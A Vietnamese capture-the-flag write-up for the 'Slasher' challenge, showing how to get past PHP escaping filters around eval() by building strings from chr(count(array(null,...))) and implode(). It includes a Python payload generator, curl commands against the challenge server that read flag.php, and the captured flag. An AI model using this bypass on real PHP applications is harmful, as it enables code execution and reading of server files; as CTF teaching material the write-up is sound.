# Slasher – Write‑up (PHP eval with extreme slash filters)

> **Target:** `http://52.59.124.14:5011`  
> **Goal:** Read `flag.php` despite heavy input mangling and `eval()` sandbox.

---

## 1) Phân tích source

```php
$output = null;
if(isset($_POST['input']) && is_scalar($_POST['input'])) {
    $input = $_POST['input'];
    $input = htmlentities($input,  ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $input = addslashes($input);
    $input = addcslashes($input, '+?<>&v=${}%*:.[]_-0123456789xb `;');
    try {
        $output = eval("$input;");
    } catch (Exception $e) {}
}
```
**Điểm mấu chốt:**  
- Server **`eval("$input;")`** → mọi thứ ta gửi sẽ trở thành mã PHP (cộng `;` tự động).  
- Trước đó input bị “băm nát” bởi 3 hàm:
  1. `htmlentities(..., ENT_QUOTES|ENT_SUBSTITUTE)`: phá `' " & < >` (biến thành entity HTML).
  2. `addslashes()`: thêm `\` trước `' " \ NUL` (phá string literal).
  3. `addcslashes(..., '+?<>&v=${}%*:.[]_-0123456789xb \` ;')`: thêm `\` trước **toàn bộ tập ký tự cấm**, bao gồm **dấu cách** và **`;`**.

### Hệ quả bộ lọc
- **Không dùng được**: khoảng trắng (space), số (`0–9`), dấu `.`, `$`, `_`, `+`, `*`, `=`, `:`, `;`, `[ ]`, `{ }`, `< >`, `%`, backtick, `' "`, chữ `v/x/b`, `&`, `?`, `-`, v.v.
- **Không dùng được** string literal (vì `addslashes`).
- Server **tự thêm `;`** ở cuối → ta **không cần** và **không nên** tự viết `;`.

---

## 2) Chiến lược khai thác

Vẫn còn các primitive hợp lệ: `return`, `readfile`, `fopen`, `fread`, `filesize`, `implode`, `array`, `chr`, `count`, `null`, dấu phẩy `,`, ngoặc `()`.

**Ý tưởng chính:**  
- **Không dùng khoảng trắng** → dùng **xuống dòng** (`\n`) giữa `return` và lệnh tiếp theo (PHP coi là whitespace).  
- **Không dùng chữ số** → tạo số bằng:  
  `count(array(null,null,...))` (lặp `null` đúng **N** lần → trả về **N**).  
- **Không gõ trực tiếp `.` hay ký tự file** → xây chuỗi `"flag.php"` bằng **ghép các `chr(ASCII)`**:  
  mỗi ký tự `c` là `chr(count(array(null×ord(c))))`, rồi `implode(array(...))`.

---

## 3) Xây số & ký tự “sạch”

### 3.1. Số N (không dùng chữ số)
```php
count(array(null,null,null,...))  // có N phần tử → trả về N
```

### 3.2. 1 ký tự
```php
chr(count(array(null × ord(ký_tự))))
```

### 3.3. Chuỗi `"flag.php"`
```php
implode(array(
  chr(count(array(null×'f'))),
  chr(count(array(null×'l'))),
  chr(count(array(null×'a'))),
  chr(count(array(null×'g'))),
  chr(count(array(null×'.'))),  // CHÚ Ý: KHÔNG gõ '.' trực tiếp, mà dùng chr(46)
  chr(count(array(null×'p'))),
  chr(count(array(null×'h'))),
  chr(count(array(null×'p')))
))
```
> Thực tế ta **không gõ** ký tự như `'f'`, `'.'`… ở input; thay vào đó generator sẽ mở rộng thành số lần `null` tương ứng `ord(ký_tự)`.

---

## 4) Payload 1 – In flag ra đầu response

Dùng `readfile(<path>)`. Hàm này **echo** nội dung file và **trả về số byte**.

**Hình thức:**  
```php
return
readfile(implode(array(chr(count(array(null×...))), ... )))
```
> `\n` giữa `return` và `readfile` thay cho khoảng trắng. **Không cần `;`** (server tự chèn).

**Gửi bằng curl (ví dụ):**
```bash
curl -s -X POST 'http://52.59.124.14:5011/' \
  --data-urlencode "input=$(cat slasher_payload.txt)"
```
- **Flag** sẽ xuất hiện **ở đầu** output (trước HTML).  
- Ở khung “Your result is” sẽ là **một số** (số byte đã đọc).

**Tệp payload sẵn dùng:**  
- [`slasher_payload.txt`](slasher_payload.txt) – payload đã sinh, không chứa ký tự cấm.  
  (Nếu mở file không thấy toàn bộ do UI rút gọn, hãy dùng `cat` để POST trực tiếp.)

**Lọc flag (ví dụ ENO{...}):**
```bash
curl -s -X POST 'http://52.59.124.14:5011/' \
  --data-urlencode "input=$(cat slasher_payload.txt)" | grep -oE 'ENO\{[^}]+\}'
```

---

## 5) Payload 2 – Flag hiện gọn trong “Your result is”

Trả về nội dung file qua `fread(fopen(...), filesize(...))`:
```php
return
fread(fopen(PATH,MODE),filesize(PATH))
```
Trong đó `PATH = implode(array(chr(count(array(...))), ...))`, `MODE = chr(count(array(...'r'...)))`.

**Gửi:**
```bash
curl -s -X POST 'http://52.59.124.14:5011/' \
  --data-urlencode "input=$(cat slasher_payload_alt.txt)"
```
- `$output` chính là **flag**, hiển thị ngay trong khung kết quả.

**Tệp payload sẵn dùng:**  
- [`slasher_payload_alt.txt`](slasher_payload_alt.txt)

---

## 6) Generator script (Python)

> Sinh payload tự động (tránh gõ tay chuỗi rất dài).

```python
def chr_by_nulls(c: str) -> str:
    n = ord(c)
    return "chr(count(array(" + ",".join(["null"] * n) + ")))"

def build_string(s: str) -> str:
    return "implode(array(" + ",".join(chr_by_nulls(c) for c in s) + "))"

path = build_string("flag.php")
mode = chr_by_nulls("r")

# Payload 1: in flag ra đầu response
payload1 = "return\nreadfile(" + path + ")"

# Payload 2: flag trong 'Your result is'
payload2 = "return\nfread(fopen(" + path + "," + mode + "),filesize(" + path + "))"

print(payload1)
print(payload2)
```
**Checklist hợp lệ:**
- Không có **space** (chỉ dùng `\n` sau `return`).
- Không có bất kỳ ký tự trong tập cấm: `'+?<>&v=${}%*:.[]_-0123456789xb \` ;`
- **Không** tự thêm `;`.

---

## 7) Vì sao chắc chắn chạy?

- Tránh hoàn toàn **string literal** và **chữ số** → không bị `addslashes`/`htmlentities` phá.  
- Tránh toàn bộ **tập cấm** của `addcslashes`.  
- Dùng hàm core **không chứa** ký tự cấm trong tên.  
- `eval("$input;")` → tạo PHP hợp lệ:
  ```php
  return
  readfile(<biểu_thức_xây_chuỗi_flag_php>);
  ```
  hoặc
  ```php
  return
  fread(fopen(<path>,<mode>),filesize(<path>));
  ```

---

## 8) Pitfalls

- **Vô tình gõ dấu cách** → bị `\ ` chèn vào, vỡ cú pháp.  
- **Gõ trực tiếp `.`** trong `flag.php` → `\.` → lỗi. Phải xây bằng `chr(46)` thông qua count.  
- **Tự viết `;`** → bị `\;` → lỗi. Server **đã** thêm `;` rồi.  
- Dùng hàm chứa `v/x/b` trong tên (vd `var_dump`) → bị backslash chèn → lỗi.  
- Mọi string phải được **xây dựng** (không có `' "`) – dùng `chr(...)` + `implode(...)`.

---

## 9) Quick use

```bash
# Payload 1 – in flag ra đầu response
curl -s -X POST 'http://52.59.124.14:5011/' \
  --data-urlencode "input=$(cat slasher_payload.txt)" | head -n 30

# Payload 2 – flag trong khung "Your result is"
curl -s -X POST 'http://52.59.124.14:5011/' \
  --data-urlencode "input=$(cat slasher_payload_alt.txt)"
```

---

## 10) Files đính kèm

- [`slasher_payload.txt`](slasher_payload.txt) – Payload 1 (readfile)  
- [`slasher_payload_alt.txt`](slasher_payload_alt.txt) – Payload 2 (fopen+fread)

> Có thể POST trực tiếp các file này lên server mục tiêu bằng `curl` như ở trên.

---

## 11) Flag

Flag: ENO{3v4L_0nC3_Ag41n_F0r_Th3_W1n_:-\)}

---

**Kết luận:** Đây là bài “code-golf bypass” cho chuỗi lọc rất gắt. Dùng `count(array(null×N))` + `chr()` + `implode()` để tái tạo chuỗi đường dẫn và tham số cần thiết, kết hợp `readfile` hoặc `fopen/fread/filesize` là đủ để đọc `flag.php` qua `eval`.
